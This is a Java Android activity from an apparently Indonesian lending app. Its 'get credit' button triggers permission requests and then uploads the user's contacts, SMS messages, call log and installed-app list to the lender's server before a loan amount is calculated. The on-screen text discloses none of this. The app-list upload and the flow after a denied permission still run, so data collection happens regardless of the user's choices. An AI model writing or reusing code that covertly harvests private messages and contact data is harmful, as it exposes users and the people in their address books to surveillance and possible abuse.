package com.lemontree.android.ui.activity;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.ImageView;

import androidx.core.app.ActivityCompat;
import androidx.core.widget.ContentLoadingProgressBar;

import com.google.android.material.button.MaterialButton;
import com.google.gson.Gson;
import com.lemontree.android.R;
import com.lemontree.android.base.BaseActivity;
import com.lemontree.android.base.BaseResponseBean;
import com.lemontree.android.bean.request.CommonReqBean;
import com.lemontree.android.bean.response.GetBankListResBean;
import com.lemontree.android.manager.BaseApplication;
import com.lemontree.android.manager.ConstantValue;
import com.lemontree.android.manager.NetConstantValue;
import com.lemontree.android.network.OKHttpClientEngine;
import com.lemontree.android.uploadUtil.Permission;
import com.lemontree.android.uploadUtil.UploadDataBySingle;
import com.lemontree.android.uploadUtil.UploadNecessaryData;
import com.lemontree.android.utils.IntentUtils;
import com.minchainx.permission.util.PermissionListener;
import com.networklite.NetworkLiteHelper;
import com.networklite.callback.GenericCallback;

import butterknife.BindView;
import butterknife.ButterKnife;
import okhttp3.Call;

import static com.lemontree.android.manager.BaseApplication.mHasUpdateAppListSuccess;
import static com.lemontree.android.manager.BaseApplication.mHasUpdateCallLogSuccess;
import static com.lemontree.android.manager.BaseApplication.mHasUpdateSmsSuccess;
import static com.lemontree.android.manager.BaseApplication.mHasUploadAddressBook;

public class InfoGetReadyActivity extends BaseActivity {

    @BindView(R.id.progress_bar)
    ContentLoadingProgressBar progressBar;
    @BindView(R.id.iv_ok)
    ImageView ivOk;
    @BindView(R.id.btn_confirm)
    MaterialButton btnConfirm;

    public static Intent createIntent(Context context) {
        return new Intent(context, InfoGetReadyActivity.class);
    }

    @Override
    protected int getLayoutResId() {
        return R.layout.activity_info_get_ready;
    }

    @Override
    protected void initializeView() {
        findViewById(R.id.btn_confirm).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //打开信息确认页
                uploadSomeInfo();
            }
        });
    }

    @Override
    protected void loadData() {
    }

    private void uploadSomeInfo() {
        new Permission(mContext, new String[]{
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,//包含READ_CALL_LOG
                Manifest.permission.READ_SMS
        }, new PermissionListener() {
            @Override
            public void onGranted() {
                uploadAccordingPermissions();
            }

            @Override
            public void onDenied() {
                uploadAccordingPermissions();
            }
        });
    }

    private void uploadAccordingPermissions() {
        progressBar.setVisibility(View.VISIBLE);
        btnConfirm.setText("Lagi menghitung jumlah pinjaman");

        new Handler().postDelayed(() -> {

            if (isGetNecessaryPermission() && !mHasUploadAddressBook) {
                uploadNecessaryData();
            } else {//否则直接计算额度
                calculateAmount();
            }
            //sms
            if (isGetSMSPermission()) {
                if (!mHasUpdateSmsSuccess) {
                    uploadSmsOnly();
                }
            }
            //call record
            if (isGetCallLogPermission()) {
                if (!mHasUpdateCallLogSuccess) {
                    uploadCallRecordOnly();
                }
            }
            //app list
            if (!mHasUpdateAppListSuccess) {
                uploadAppListOnly();
            }
        }, 100);
    }

    private boolean isGetNecessaryPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean isGetSMSPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean isGetCallLogPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * 上传数据
     */
    private void uploadNecessaryData() {
        new UploadNecessaryData().upload(BaseApplication.mUserId, new UploadNecessaryData.UploadDataListener() {
            @Override
            public void success() {
                mHasUploadAddressBook = true;
                calculateAmount();
            }

            @Override
            public void error() {
                progressBar.setVisibility(View.INVISIBLE);
                btnConfirm.setText("Dapatkan kredit →");
            }
        });
    }

    /**
     * 上传短信
     */
    private void uploadSmsOnly() {
        new UploadDataBySingle().uploadSms(BaseApplication.mUserId, new UploadDataBySingle.UploadSmsListener() {
            @Override
            public void success() {
                mHasUpdateSmsSuccess = true;
            }

            @Override
            public void error() {
            }
        });
    }

    /**
     * 上传通话记录
     */
    private void uploadCallRecordOnly() {
        new UploadDataBySingle().uploadCallRecord(BaseApplication.mUserId, new UploadDataBySingle.UploadCallRecordListener() {
            @Override
            public void success() {
                mHasUpdateCallLogSuccess = true;
            }

            @Override
            public void error() {
            }
        });
    }

    /**
     * 上传app list
     */
    private void uploadAppListOnly() {
        new UploadDataBySingle().uploadAppList(BaseApplication.mUserId, new UploadDataBySingle.UploadAppListListener() {
            @Override
            public void success() {
                mHasUpdateAppListSuccess = true;
            }

            @Override
            public void error() {
            }
        });
    }

    /**
     * 计算额度
     */
    private void calculateAmount() {
        NetworkLiteHelper
                .postJson()
                .url(NetConstantValue.BASE_HOST + ConstantValue.CALCULATE_AMOUNT)
                .content(new Gson().toJson(new CommonReqBean()))
                .build()
                .execute(OKHttpClientEngine.getNetworkClient(), new GenericCallback<GetBankListResBean>() {
                    @Override
                    public void onSuccess(Call call, GetBankListResBean response, int id) {
                        progressBar.setVisibility(View.INVISIBLE);
                        btnConfirm.setText("Dapatkan kredit →");

                        if (response != null && BaseResponseBean.SUCCESS.equals(response.res_code)) {
                            IntentUtils.gotoMainActivity(mContext, MainActivity.TAB_HOME);
                            finishActivity();
                        }
                    }

                    @Override
                    public void onFailure(Call call, Exception exception, int id) {
                        progressBar.setVisibility(View.INVISIBLE);
                        btnConfirm.setText("Dapatkan kredit →");
                    }
                });
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // TODO: add setContentView(...) invocation
        ButterKnife.bind(this);
    }
}
